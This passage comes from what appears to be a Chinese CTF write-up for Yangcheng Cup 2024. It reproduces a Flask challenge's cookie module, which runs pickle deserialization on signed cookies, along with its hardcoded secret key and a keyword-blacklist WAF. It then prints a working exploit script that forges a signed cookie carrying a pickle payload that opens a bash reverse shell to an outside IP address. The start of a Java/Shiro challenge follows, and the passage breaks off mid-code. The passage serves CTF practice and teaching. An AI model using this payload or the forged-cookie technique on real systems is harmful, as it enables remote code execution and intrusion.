out!"</span>    data <span class="token operator">=</span> get_cookie<span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">,</span> secret<span class="token operator">=</span>secret_code<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        data <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"username"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'user.html'</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">"guest"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> data<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"admin"</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'admin.html'</span><span class="token punctuation">,</span> name<span class="token operator">=</span>data<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> data<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">"admin"</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'user.html'</span><span class="token punctuation">,</span> name<span class="token operator">=</span>data<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    os<span class="token punctuation">.</span>chdir<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">)</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8080</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>逻辑很清晰，先登录，然后是pickle反序列化</p><p>把相关的模块也读出来</p><p>&#x2F;usr&#x2F;etc&#x2F;app&#x2F;cookie.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token keyword">import</span> hashlib<span class="token keyword">import</span> hmac<span class="token keyword">import</span> pickle<span class="token keyword">from</span> flask <span class="token keyword">import</span> make_response<span class="token punctuation">,</span> request<span class="token builtin">unicode</span> <span class="token operator">=</span> <span class="token builtin">str</span><span class="token builtin">basestring</span> <span class="token operator">=</span> <span class="token builtin">str</span><span class="token comment"># Quoted from python bottle template, thanks :D</span><span class="token keyword">def</span> <span class="token function">cookie_encode</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>    msg <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    sig <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>hmac<span class="token punctuation">.</span>new<span class="token punctuation">(</span>tob<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">,</span> msg<span class="token punctuation">,</span> digestmod<span class="token operator">=</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> tob<span class="token punctuation">(</span><span class="token string">'!'</span><span class="token punctuation">)</span> <span class="token operator">+</span> sig <span class="token operator">+</span> tob<span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">)</span> <span class="token operator">+</span> msg<span class="token keyword">def</span> <span class="token function">cookie_decode</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> tob<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token keyword">if</span> cookie_is_encoded<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>        sig<span class="token punctuation">,</span> msg <span class="token operator">=</span> data<span class="token punctuation">.</span>split<span class="token punctuation">(</span>tob<span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> _lscmp<span class="token punctuation">(</span>sig<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>hmac<span class="token punctuation">.</span>new<span class="token punctuation">(</span>tob<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">,</span> msg<span class="token punctuation">,</span> digestmod<span class="token operator">=</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token boolean">None</span><span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">b'R'</span><span class="token punctuation">,</span> <span class="token string">b'secret'</span><span class="token punctuation">,</span> <span class="token string">b'eval'</span><span class="token punctuation">,</span> <span class="token string">b'file'</span><span class="token punctuation">,</span> <span class="token string">b'compile'</span><span class="token punctuation">,</span> <span class="token string">b'open'</span><span class="token punctuation">,</span> <span class="token string">b'os.popen'</span><span class="token punctuation">]</span>    valid <span class="token operator">=</span> <span class="token boolean">False</span>    <span class="token keyword">for</span> word <span class="token keyword">in</span> blacklist<span class="token punctuation">:</span>        <span class="token keyword">if</span> word <span class="token keyword">in</span> data<span class="token punctuation">:</span>            valid <span class="token operator">=</span> <span class="token boolean">True</span>            <span class="token comment"># print(word)</span>            <span class="token keyword">break</span>    <span class="token keyword">return</span> valid<span class="token keyword">def</span> <span class="token function">cookie_check</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> secret<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span>key<span class="token punctuation">)</span>    data <span class="token operator">=</span> tob<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> data<span class="token punctuation">:</span>        <span class="token keyword">if</span> cookie_is_encoded<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>            sig<span class="token punctuation">,</span> msg <span class="token operator">=</span> data<span class="token punctuation">.</span>split<span class="token punctuation">(</span>tob<span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> _lscmp<span class="token punctuation">(</span>sig<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>hmac<span class="token punctuation">.</span>new<span class="token punctuation">(</span>tob<span class="token punctuation">(</span>secret<span class="token punctuation">)</span><span class="token punctuation">,</span> msg<span class="token punctuation">,</span> digestmod<span class="token operator">=</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                res <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>msg<span class="token punctuation">)</span>                <span class="token keyword">if</span> waf<span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">return</span> <span class="token boolean">True</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    <span class="token keyword">return</span> <span class="token boolean">False</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">tob</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> enc<span class="token operator">=</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> s<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>enc<span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token builtin">unicode</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_cookie</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> secret<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    value <span class="token operator">=</span> request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span>key<span class="token punctuation">)</span>    <span class="token keyword">if</span> secret <span class="token keyword">and</span> value<span class="token punctuation">:</span>        dec <span class="token operator">=</span> cookie_decode<span class="token punctuation">(</span>value<span class="token punctuation">,</span> secret<span class="token punctuation">)</span>        <span class="token keyword">return</span> dec<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">if</span> dec <span class="token keyword">and</span> dec<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> key <span class="token keyword">else</span> default    <span class="token keyword">return</span> value <span class="token keyword">or</span> default<span class="token keyword">def</span> <span class="token function">cookie_is_encoded</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token builtin">bool</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span>tob<span class="token punctuation">(</span><span class="token string">'!'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">and</span> tob<span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">)</span> <span class="token keyword">in</span> data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">_lscmp</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token keyword">not</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token number">0</span> <span class="token keyword">if</span> x <span class="token operator">==</span> y <span class="token keyword">else</span> <span class="token number">1</span> <span class="token keyword">for</span> x<span class="token punctuation">,</span> y <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">len</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">set_cookie</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> value<span class="token punctuation">,</span> secret<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token operator">**</span>options<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> secret<span class="token punctuation">:</span>        value <span class="token operator">=</span> touni<span class="token punctuation">(</span>cookie_encode<span class="token punctuation">(</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">,</span> secret<span class="token punctuation">)</span><span class="token punctuation">)</span>        resp <span class="token operator">=</span> make_response<span class="token punctuation">(</span><span class="token string">"success"</span><span class="token punctuation">)</span>        resp<span class="token punctuation">.</span>set_cookie<span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">,</span> value<span class="token punctuation">,</span> max_age<span class="token operator">=</span><span class="token number">3600</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> resp    <span class="token keyword">elif</span> <span class="token keyword">not</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span> <span class="token builtin">basestring</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> TypeError<span class="token punctuation">(</span><span class="token string">'Secret key missing for non-string Cookie.'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">4096</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string">'Cookie value to long.'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">touni</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> enc<span class="token operator">=</span><span class="token string">'utf8'</span><span class="token punctuation">,</span> err<span class="token operator">=</span><span class="token string">'strict'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> s<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>enc<span class="token punctuation">,</span> err<span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token builtin">unicode</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&#x2F;usr&#x2F;etc&#x2F;app&#x2F;config&#x2F;secret_key.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">secret_code <span class="token operator">=</span> <span class="token string">"EnjoyThePlayTime123456"</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后开始审代码，我们的目标是</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">invalid <span class="token operator">=</span> cookie_check<span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">,</span> secret<span class="token operator">=</span>secret_code<span class="token punctuation">)</span><span class="token keyword">if</span> invalid<span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">"Nope, invalid code get out!"</span>data <span class="token operator">=</span> get_cookie<span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">,</span> secret<span class="token operator">=</span>secret_code<span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    data <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>跟进<code>cookie_check</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">b'R'</span><span class="token punctuation">,</span> <span class="token string">b'secret'</span><span class="token punctuation">,</span> <span class="token string">b'eval'</span><span class="token punctuation">,</span> <span class="token string">b'file'</span><span class="token punctuation">,</span> <span class="token string">b'compile'</span><span class="token punctuation">,</span> <span class="token string">b'open'</span><span class="token punctuation">,</span> <span class="token string">b'os.popen'</span><span class="token punctuation">]</span>    valid <span class="token operator">=</span> <span class="token boolean">False</span>    <span class="token keyword">for</span> word <span class="token keyword">in</span> blacklist<span class="token punctuation">:</span>        <span class="token keyword">if</span> word <span class="token keyword">in</span> data<span class="token punctuation">:</span>            valid <span class="token operator">=</span> <span class="token boolean">True</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>word<span class="token punctuation">)</span>            <span class="token keyword">break</span>    <span class="token keyword">return</span> valid<span class="token keyword">def</span> <span class="token function">cookie_check</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> secret<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span>key<span class="token punctuation">)</span>    data <span class="token operator">=</span> tob<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> data<span class="token punctuation">:</span>        <span class="token keyword">if</span> cookie_is_encoded<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>            sig<span class="token punctuation">,</span> msg <span class="token operator">=</span> data<span class="token punctuation">.</span>split<span class="token punctuation">(</span>tob<span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> _lscmp<span class="token punctuation">(</span>sig<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>hmac<span class="token punctuation">.</span>new<span class="token punctuation">(</span>tob<span class="token punctuation">(</span>secret<span class="token punctuation">)</span><span class="token punctuation">,</span> msg<span class="token punctuation">,</span> digestmod<span class="token operator">=</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                res <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>msg<span class="token punctuation">)</span>                <span class="token keyword">if</span> waf<span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">return</span> <span class="token boolean">True</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    <span class="token keyword">return</span> <span class="token boolean">False</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ban了R指令，用o指令随便绕，然后审计一圈下来可知下面的<code>cookie_check</code>用于检测是否是<code>set_cookie</code>产生的cookie</p><p>那就依样画葫芦生成一个</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> cookie <span class="token keyword">import</span> cookie_encode<span class="token keyword">from</span> config<span class="token punctuation">.</span>secret_key <span class="token keyword">import</span> secret_codeopcode<span class="token operator">=</span><span class="token triple-quoted-string string">b'''(cossystemS'bash -c "bash -i >&amp; /dev/tcp/115.236.153.177/30908 &lt;&amp;1"'o.'''</span>a<span class="token operator">=</span>opcode<span class="token keyword">print</span><span class="token punctuation">(</span>cookie_encode<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">,</span>opcode<span class="token punctuation">)</span><span class="token punctuation">,</span>secret_code<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>生成的 cookie 直接传入 &#x2F;board 路由弹shell</p><p><img src="/blog/2024/08/27/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024/image-20240827112051806.png" alt="image-20240827112051806"></p><hr><h1 id="ez-java（Unsolved）"><a href="#ez-java（Unsolved）" class="headerlink" title="ez_java（Unsolved）"></a>ez_java（Unsolved）</h1><p>审审代码</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span></span><span class="token class-name">SecurityUtils</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>authc<span class="token punctuation">.</span></span><span class="token class-name">AuthenticationException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>authc<span class="token punctuation">.</span></span><span class="token class-name">UsernamePasswordToken</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>subject<span class="token punctuation">.</span></span><span class="token class-name">Subject</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Controller</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMapping</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestParam</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">ResponseBody</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@Controller</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">IndexControler</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">IndexControler</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/doLogin"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">createSql</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span> <span class="token class-name">String</span> username<span class="token punctuation">,</span> <span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span> <span class="token class-name">String</span> password<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Subject</span> subject <span class="token operator">=</span> <span class="token class-name">SecurityUtils</span><span class="token punctuation">.</span><span class="token function">getSubject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            subject<span class="token punctuation">.</span><span class="token function">login</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">UsernamePasswordToken</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token string">"forward:/user/index"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">AuthenticationException</span> var5<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token string">"forward:/login"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/wrong"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">error</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string">"wrong"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/login"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string">"login"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>登录接口</p><p><img src="/blog/2024/08/27/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024/image-20240828084825553.png" alt="image-20240828084825553"></p><p>这里给了账密可以登录进去</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>ycbjava<span class="token punctuation">.</span>utils<span class="token punctuation">.</span></span><span class="token class-name">MyObjectInputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayInputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayOutputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Files</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">OpenOption</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token 